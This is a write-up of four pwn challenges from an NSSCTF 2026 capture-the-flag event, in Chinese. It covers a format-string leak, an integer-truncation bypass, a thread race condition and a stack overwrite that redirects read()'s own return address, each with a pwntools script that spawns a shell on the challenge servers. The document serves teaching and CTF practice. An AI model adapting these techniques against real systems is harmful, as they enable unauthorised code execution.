+++
date = '2026-10-28T22:13:41+08:00'
draft = false
title = 'NSSCTF 2026秋季赛'
tags = ["pwn"]
categories = ["CTF"]
description = ""
+++

## nc签到？黑盒

显然是一个格式化字符串，根据提示，我们是可以直接将flag泄露出来，所以用%s就行了。从%1$s开始一个一个试，这里在%8$s出来了

![图1](/images/NSSCTF-2026秋季赛/图1.png)

## never_arrive

这里给出main:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  if ( (int)vuln() <= 255 )
    system("/bin/sh");
  puts(&s_);
  puts("try again?");
  return 0;
}
```

这里要求vuln返回值<=255，进vuln看看

```c
__int64 vuln()
{
  _QWORD v1[2]; // [rsp+0h] [rbp-10h] BYREF

  v1[1] = __readfsqword(0x28u);
  v1[0] = 0LL;
  puts(&s);
  __isoc99_scanf("%lld", v1);
  if ( v1[0] <= 255LL )
    exit(0);
  return v1[0];
}
```

单纯看这段代码：**这里本身没有溢出！**
`__readfsqword(0x28)` = canary 栈保护标记；

- v1 数组只有两个 QWORD，scanf 只写入 v1 [0] 这一个位置；
- 它只覆盖 `v1[0]`，不会往后写 canary、rbp、返回地址。
可以发现，`scanf("%lld")`接收 64 位十进制整数，不是字符串，**不能输入 \x00 这类原始字节**
那怎么办呢？
两条约束，同时要满足：

1. **vuln 内部判断：`v1[0] > 255`**，否则 vuln 直接 exit，根本不会返回到 main！
2. **main 里判断：`(int)v1_ret <= 255`**，才会触发 `system("/bin/sh")`

那怎么办呢？
原理：64bit → 强制截断到 32 位有符号 int

`scanf("%lld")` 读进来是 64 位 long long
C 语言强制 `(int)val` 的行为：**只保留低 32 比特，当成 signed int**。
我们要构造一个 X：

- 低 32bit 的值（signed int） ≤ 255
- 完整 64bit 数值 > 255

最简单构造：
让**低 32 位 = 0**
也就是：

```plaintext
二进制：0000 0000 0000 0000 0000 0000 0001 0000 0000 0000 0000 0000 0000 0000 0000 0000
十六进制：0x00000001 00000000
十进制：4294967296
```

![图2](/images/NSSCTF-2026秋季赛/图2.png)

这里本地测试一下，发现已经拿到shell了

![图3](/images/NSSCTF-2026秋季赛/图3.png)

简单写个脚本远程试一下

```python
from pwn import *
io = remote('node10.anna.nssnode.cn',29453)
io.recv()
io.sendline(b'4294967296')
io.interactive()
```

![图4](/images/NSSCTF-2026秋季赛/图4.png)

## creeper?

进入漏洞函数内

```c
unsigned __int64 sub_152A()
{
  int n2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Steve: I want to craft a diamond pickaxe. Can you help me?");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts("1.Mining");
          puts("2.Break dead bushes");
          puts("3.Check materials");
          puts("4.Craft a diamond pickaxe");
          puts("5.But I refuse");
          printf("> ");
          n2 = sub_1317();
          if ( n2 != 1 )
            break;
          if ( !dword_4018 )
            goto LABEL_4;
          printf("Mining");
          putchar(46);
          putchar(46);
          putchar(46);
          putchar(10);
          puts("OK.");
          sub_144B(sub_137B);
        }
        if ( n2 != 2 )
          break;
        if ( dword_401C )
        {
          printf("Breaking");
          putchar(46);
          putchar(46);
          putchar(46);
          putchar(10);
          puts("OK.");
          sub_144B(sub_13E3);
        }
        else
        {
LABEL_4:
          puts("You can only do this once!");
        }
      }
      if ( n2 != 3 )
        break;
      printf("diamond: %d\n", n2);
      printf("stick: %d\n", dword_4014);
    }
    if ( n2 == 4 )
      break;
    if ( n2 == 5 )
      exit(0);
    puts("invalid input!");
  }
  if ( n2 <= 2 || dword_4014 <= 1 )
  {
    puts("Not enough!\n");
    exit(0);
  }
  puts("Craft success.");
  sub_14CB();
  return v2 - __readfsqword(0x28u);
}
```

`sub_14CB()`是个后门
这个程序是一个基于 pthread 的菜单式程序（pwn，x86-64 PIE，包含 system），关键全局变量位于 .data 段：

|地址|含义|初值|
|---|---|---|
|0x4010|diamond（钻石）|数量0|
|0x4014|stick（木棍）|数量0|
|0x4018|Mining|可用标志1|
|0x401c|Breaking|可用标志1|
|0x404c|线程计数|0|

核心逻辑：

选择 1 时，如果 0x4018 != 0，程序会 pthread_create 一个挖矿线程，然后立即返回菜单；该线程先检查标志，再执行 usleep(100000)（持续 100 ms），然后把 diamond 加 1，并将标志清零。
选择 2 时同理，由对应线程把 stick 加 1。
选择 4 时，只有当 diamond > 2 且 stick > 1 才能合成；合成成功后会调用 gift()，其中的 system("$0") 直接起一个 shell。
问题在于检查与清零之间存在 100 ms 的竞态窗口（TOCTOU）：主线程只看到标志仍为 1 就不断创建线程，而在 100 ms 内创建的每个线程都已经通过了标志检查，醒来后都会执行 +1。因此，在窗口内连续发送 3 次 1、2 次 2，就能得到 3 个 diamond 和 2 个 stick，满足合成条件，再选择 4 即获得 shell。
随便挑选一个看看

```c
unsigned __int64 __fastcall sub_144B(void *(*start_routine)(void *))
{
  pthread_t newthread; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( n127 > 127 )
    exit(0);
  pthread_create(&newthread, 0LL, start_routine, 0LL);
  pthread_detach(newthread);
  ++n127;
  return v3 - __readfsqword(0x28u);
}
```

```python
from pwn import *
import time
io = remote('node10.anna.nssnode.cn',28450)
io.recvuntil(b'>')
io.send(b'1\n' * 3)
io.send(b'2\n' * 2)
time.sleep(0.5)
io.send(b'3\n')          # 确认 diamond: 3 / stick: 2
io.send(b'4\n')          # 合成 -> system("$0") -> shell
io.interactive()
```

![图5](/images/NSSCTF-2026秋季赛/图5.png)

## going_run

| 保护 | 状态 |
| --- | --- |
| PIE | 关闭（固定基址 0x400000） |
| NX | 开启 |
| Canary | 关闭 |
| RELRO | Partial |
| CET 标记 | 有（IBT/SHSTK 属性），远程未实际启用 shadow stack，否则改返回地址会直接崩 |

`gitf()` 已经现成地调用了 `system("/bin/sh")`：

```asm
40121d <gitf>:
    lea rdi, "我会说你好"
    call puts
    lea rdi, "/bin/sh"
    call system
    ret
```

所以目标很明确：劫持控制流到 `0x40121d`

`main` 的关键循环：

```c
int i = 0;                         // rbp-4
for (int j = 0; j <= 32; j++) {    // rbp-8
    read(0, buf + i, 8);           // buf = rbp-0x20
    i++;
    if (i > 40) {                  
        printf("你没有跑过我");
        exit(0);
    }
}
```

栈布局：

```c
rbp-0x28  read() 的返回地址（call 时压入）
rbp-0x20  buf[0]        <- 写入起点
...
rbp-0x08  j  = buf+24
rbp-0x04  i  = buf+28
rbp+0x00  saved rbp     = buf+32
rbp+0x08  main 返回地址  = buf+40
```

有三个坑：

坑 1：i、j 在缓冲区里

`j` 和 `i` 分别是 `buf+24`、`buf+28`。第 17 次 read 开始写 `j`，第 21 次开始写 `i`。如果不管它们，循环会提前结束，或者下一次 read 的落点直接跑飞。

坑 2：每次只前进 1 字节，但写 8 字节

第 `t` 次 read 写 `buf+t .. buf+t+7`，相邻两次重叠 7 字节。最终：

```c
buf[k] = 第 k 次 read 的第 0 个字节   (k < 21 时成立)
```

所以不能把 `p64(addr)` 整体放在第 0 块里——后面 7 次 read 会把 `buf[1..7]` 覆盖掉。必须让第 `k` 块的第 0 字节等于地址的第 `k` 字节。

坑 3：直接覆盖 main 返回值会被 exit(0) 截胡
直接覆盖 main 的返回地址（buf+40）行不通：
当 i=40 时 read 确实会写到 rbp+8 的返回地址，但 read 返回后执行i++ 变成 41，立刻进入 if (i > 40) -> exit(0)。被覆盖的 main 返回地址永远没有机会被 ret 使用，如下：

```c
add DWORD PTR [rbp-4], 1    ; i = 41
cmp DWORD PTR [rbp-4], 0x28
jle ...
call printf
call exit                   ; 直接退出
```

`main` 的返回地址根本没机会被 `ret` 用到。因此**不能走常规 ret2win 覆盖 main 返回地址**。

利用思路：让 read 改写自己的返回地址

`i` 是 signed int，`jle` 是有符号比较，**负数可以通过 `i > 40` 的检查**

把 `i` 改成 `-9`，read 结束后 `i++` 变成 `-8`。下一次 read 的目标：

```c
buf + (-8) = rbp-0x28
```

而 `main` 的 `rsp = rbp-0x20`，`call read` 刚好把返回地址压到 `rbp-0x28`。于是 read 把 8 字节写进**自己本次调用的返回地址槽**；read 一返回，就直接跳到我们写入的地址。

最终控制流：

```c
read 返回
  -> 0x40101a (ret gadget)      ; 只做栈对齐
  -> 0x40121d (gitf)
  -> puts("我会说你好"); system("/bin/sh")
```

> rsp = rbp-0x20 -> ret 弹出 buf[0..7] -> rsp = rbp-0x18

此时 `rsp % 16 == 8`，再进 `gitf` 正好符合 SysV ABI 的函数入口对齐要求。

Payload 布局

共 26 个 8 字节块：

| t | 写入位置（相对 buf） | 发送内容 | 目的 / 踩坑 |
| --- | --- | --- | --- |
| 0~7 | 0~7 | 每块首字节 = `0x40121d` 对应字节 | 拼出 `buf[0..7]=0x40121d`，作为 ret 的第二跳 |
| 8~16 | 8~16 | 0 | 填充 |
| 17~20 | 17~20 | 0 | 写入开始碰到 `j`（buf+24），必须清零，否则 j>32 提前退出 |
| 21 | 21 | `00*7 15` | j=0；i 最低字节写成 21，自增后仍为 22 |
| 22 | 22 | `00*6 16 00` | j=0；i 低 2 字节写成 22 |
| 23 | 23 | `00*5 17 00 00` | j=0；i 低 3 字节写成 23 |
| 24 | 24 | `00000000 f7ffffff` | j=0；i=-9，自增后 -8，通过有符号检查 |
| 25 | **-8 (rbp-0x28)** | `1a10400000000000` | 覆盖 read 自己的返回地址，跳到 ret gadget |

之后：

> read -> ret(0x40101a) -> 弹出 buf[0..7]=0x40121d -> gitf -> /bin/sh

```python
from pwn import *
io = remote('node4.anna.nssnode.cn',23950)

gitf = 0x40121d
ret = 0x40101a

io.recvuntil('你跑不过我，你信不信'.encode())

addr = p64(gitf)

# 1) 前 8 块：拼出 buf[0:8] = GITF。
#    每次 read 只有第 0 个字节不会被下一次覆盖，
#    所以第 k 块的第 0 字节 = 地址的第 k 字节。
chunks = []
for k in range(8):
    chunks.append(bytes([addr[k]]) + b'\x00' * 7)
# 2) 第 8~16 块：填充，没有特殊作用
for _ in range(9):
    chunks.append(b'\x00' * 8)
# 3) 第 17~20 块：写入开始碰到 j（buf+24），清 0，
#    否则 j 变大后循环会提前结束
for _ in range(4):
    chunks.append(b'\x00' * 8)
# 4) 第 21~23 块：写入开始碰到 i（buf+28）。
#    这里保持 i 等于当前轮数；i 的最高字节要等第 24 块才能写，
#    所以现在还不能写负数。
chunks.append(b'\x00' * 7 + p8(21))
chunks.append(b'\x00' * 6 + p8(22) + b'\x00')
chunks.append(b'\x00' * 5 + p8(23) + b'\x00' * 2)
# 5) 第 24 块：完整覆盖 j 和 i，把 i 设为 -9。
#    read 后还有 i++，所以会变成 -8，能通过 if (i > 40)
chunks.append(p32(0) + p32(0xfffffff7))
# 6) 第 25 块：i=-8，这次 read 写到 rbp-0x28，
#    正好是 read 自己的返回地址。先跳到 ret 对齐栈。
chunks.append(p64(ret))

for chunk in chunks:
    io.send(chunk)


io. interactive()

```

![图6](/images/NSSCTF-2026秋季赛/图6.png)

> 啊~格调！太有格调了！（bushi）